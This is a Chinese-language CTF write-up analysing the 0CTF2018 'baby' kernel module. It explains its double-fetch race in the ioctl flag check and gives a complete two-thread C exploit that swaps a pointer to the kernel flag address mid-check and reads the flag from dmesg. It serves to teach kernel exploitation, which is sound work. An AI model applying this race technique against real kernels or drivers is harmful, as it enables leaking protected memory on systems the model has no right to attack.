# 条件竞争
在用户态pwn中有一类题型叫做条件竞争。当程序需要在不同时刻访问相同一块内存时，如果没有做好并发访问的限制和检查，就有可能会产生恶意数据或执行恶意代码。今天笔者就来分析一下内核态中的条件竞争，以一道经典的题辅助学习。


# 0CTF2018-baby（double fetch）
## Step 1: 分析程序与调试
按照惯例，打开IDA。
![](https://img-blog.csdnimg.cn/e7047afbb0d7497f8300c571445a1582.png)
这个模块实现的功能只有一个：ioctl。我们跟进到其调用的ioctl_impl函数看一下。
![](https://img-blog.csdnimg.cn/5303f6ef46de4a32ba173dd55789e8d4.png)
ioctl的指令码只有两种：0x6666和0x1337。当指令码为0x6666时，会打印出flag的地址。
当指令码为0x1337时，其会调用_chk_range_not_ok函数。一看名字就不难猜测，这是一个检查越界的函数：
![](https://img-blog.csdnimg.cn/c6b5819ea1fc4add968768a9a0ba9ba4.png)
上面的__CFADD__函数的功能是返回两个参数相加后的CF标志位。当两个参数相加在最高位产生进位时CF为1，否则为0。不难想到如果a1和a2相加产生进位，那么一定会导致越界溢出。传入的第三个参数应该是数组的末尾地址，后面要判断a1+a2是否大于v4。

回到ioctl_impl函数，这里判断传入的第三个参数不能大于``*(_QWORD *)(__readgsqword((unsigned int)&current_task) + 0x1358)``这个东西。那这个东西到底是多少呢，我们写一个简单的程序调用一下这个模块看看。

```c
//
// Created by root on 22-7-23.
//
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>

void print_binary(char* buf, int length);

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
}

int main(){
    int fd = open("/dev/baby", O_RDWR);
    int a;
    printf("%p\n", main);
    scanf("%d", &a);
    ioctl(fd, 0x6666);
    char b[0x10] = {0};
    ioctl(fd, 0x1337, b);
}
```

不知道是什么原因，本题的内核没有办法直接下断点，也没有办法将断点下在用户态程序中。尝试了很长时间，才找到调试的方法：

### 重要：内核模块调试方法：
首先打开init文件，将权限改为root（即在启动sh的那一行把gid从1000改成0），然后启动内核输入lsmod命令获取到模块的加载地址。然后我们**不用去管syscall到底调用了模块的什么函数，不用去管这个函数在什么地方，直接将断点下在输出的加载地址上。注意，其输出的地址是模块加载的起始地址，但依然可以发挥断点的作用。**
```
/ # lsmod
baby 16384 0 - Live 0xffffffffc02f8000 (OE)
```
如上面的输出，我们可以直接将断点下在0xffffffffc02f8000，而无需在其上加上ioctl函数的偏移，也可以起到断点的作用。（亲测有效）

通过这种方式，我们成功调试漏洞模块，然后找到了``*(_QWORD *)(__readgsqword((unsigned int)&current_task) + 0x1358)``的值到底是多少：0x7ffffffff000。这是用户态栈区的最高地址，因此只要我们传入的是一个不太大的地址，都是可以的。
![](https://img-blog.csdnimg.cn/e00e1f4520c14f25a8ed3a7081c2183c.png)
再回去看一下反汇编，注意第一个检查中的第一个参数cmpStr应该是一个指针，而第二个检查中的第二个参数应该表示字符串的长度，这里是将地址的值和第二个参数相加，因此不难猜测。即使猜不出来，第三个检查应该就非常明显了，检查这里的值是否等于flag的长度。flag的长度为33。因此我们要传入的参数应该是一个结构体的地址，这个结构体的前8字节是一个char*指针，后面8字节是33。
![](https://img-blog.csdnimg.cn/f93aadf8db39412ca658af074d21fa9c.png)
在判断之后，会对传入的字符串进行检查，如果与flag相等则输出flag。这里就产生了竞争条件漏洞。

<font color=red>**如果在进行if判断的时候，我们的地址传入的是正常的用户态地址，而在执行后面的字符串比较时，这个地址就被改变到了flag处，会怎么样呢？显然模块会用flag去比较其自身，这样显然是相等的。然后flag就能够被输出。如果我们使用双线程，就可以和内核模块竞争字符串地址这块内存的访问。只要能够在这个时间窗口成功修改字符串地址，后面的检查就可以通过。因此简单点说，竞争条件就是“时间的活”。**</font>

在C语言中，我们使用pthread_create函数创建一个线程，可以让一个线程执行一个函数。具体的参数调用规则参见[资料](https://blog.csdn.net/wushuomin/article/details/80051295?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165858376216782391822691%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165858376216782391822691&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-80051295-null-null.142^v33^control,185^v2^control&utm_term=pthread_create&spm=1018.2226.3001.4187)。

因此我们写出exp：

```c
//
// Created by root on 22-7-23.
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>

typedef struct msg{
    char* buffer;
    int length;
}msg;
size_t flag_address;
bool success = false;
#define WRITE_TIME 1000
msg m;
pthread_t competition_thread;

void* competition(){
    while(!success){
        for(int i=0; i<WRITE_TIME; i++)
            m.buffer = flag_address;
    }
    return NULL;
}

int main(){
    int fd = open("/dev/baby", O_RDWR);
    ioctl(fd, 0x6666);
    system("dmesg | grep 'flag' > temp.txt");

    int file = open("/temp.txt", O_RDWR);
    char context[0x100] = {0};
    read(file, context, 49);
    flag_address = strtoull(context + 31, NULL, 16);
    close(file);

    m.buffer = context;
    m.length = 33;

    pthread_create(&competition_thread, NULL, competition, NULL);
    while(!success){
        for(int i=0; i<WRITE_TIME; i++){
            m.buffer = context;
            ioctl(fd, 0x1337, &m);
        }
        system("dmesg | grep 'flag' > temp.txt");
        file = open("/temp.txt", O_RDWR);
        read(file, context, 0x80);
        if(strstr(context, "flag{") != NULL)
            success = true;
    }

    printf("%s\n", context);

}

```

其中在规划两者竞争的时候需要注意应该如何写代码，我们应该让二者充分竞争，所以双方修改这一个地方的总次数最好不要相差太多，否则可能难以达到竞争的目的。
![](https://img-blog.csdnimg.cn/52944e2a49444a7483022b8c38567c9d.png)
由此可见，本题中竞争条件的利用并不是很难，难就难在当我们拿到这一题时，我们应该怎样才能够发现这道题存在条件竞争漏洞。本题的条件竞争属于double fetch，它通常的流程是：检查代码首先访问某一块内存，确认数据没有问题后主要操作代码再一次访问同一块内存，显然当这块内存没有被上锁的情况下，中间的时间空当是可以被利用的，这种检查也是线程不安全的。
